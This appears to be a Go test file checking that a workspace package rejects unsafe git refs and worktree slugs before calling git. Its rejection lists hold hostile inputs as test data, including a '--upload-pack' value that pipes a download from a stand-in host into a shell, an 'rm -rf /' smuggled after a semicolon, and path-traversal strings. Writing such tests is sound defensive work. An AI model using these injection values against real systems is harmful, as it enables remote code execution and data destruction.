package workspace

import "testing"

// A ref becomes a positional git argument, but git still parses a leading '-' as an option.
// `--upload-pack=...` executes on fetch, so the check has to happen before any git call.
func TestAssertSafeGitRefRejectsOptionInjection(t *testing.T) {
	bad := []string{
		"--upload-pack=curl evil.example|sh",
		"-b",
		"main --orphan=x",
		"main;rm -rf /",
		"main`id`",
		"../escape",
		"main@{1}",
		"tab\there",
		"",
	}
	for _, ref := range bad {
		if err := AssertSafeGitRef(ref, "base ref"); err == nil {
			t.Fatalf("AssertSafeGitRef(%q) should have failed", ref)
		}
	}

	good := []string{"main", "feature/thing", "release-2026.10", "user/fix.v2"}
	for _, ref := range good {
		if err := AssertSafeGitRef(ref, "base ref"); err != nil {
			t.Fatalf("AssertSafeGitRef(%q) rejected a valid ref: %v", ref, err)
		}
	}
}

// The slug becomes a path component under the byspace-owned worktrees directory, so a separator
// or ".." would write outside it.
func TestAssertSafeWorktreeSlugRejectsPathTraversal(t *testing.T) {
	for _, slug := range []string{"..", ".", "../../etc", "a/b", `a\b`, "-rf"} {
		if err := AssertSafeWorktreeSlug(slug); err == nil {
			t.Fatalf("slug %q should have been rejected", slug)
		}
	}
	for _, slug := range []string{"", "my-feature", "fix_1", "v2.1"} {
		if err := AssertSafeWorktreeSlug(slug); err != nil {
			t.Fatalf("slug %q should be accepted: %v", slug, err)
		}
	}
}

// CreateWorktree must refuse before touching git, so an injected ref cannot reach a fetch.
func TestCreateWorktreeRejectsUnsafeInput(t *testing.T) {
	if _, _, err := CreateWorktree(nil, t.TempDir(), t.TempDir(), "../escape", "main"); err == nil {
		t.Fatal("unsafe slug must be refused")
	}
	if _, _, err := CreateWorktree(nil, t.TempDir(), t.TempDir(), "ok", "--upload-pack=x"); err == nil {
		t.Fatal("unsafe base ref must be refused")
	}
}
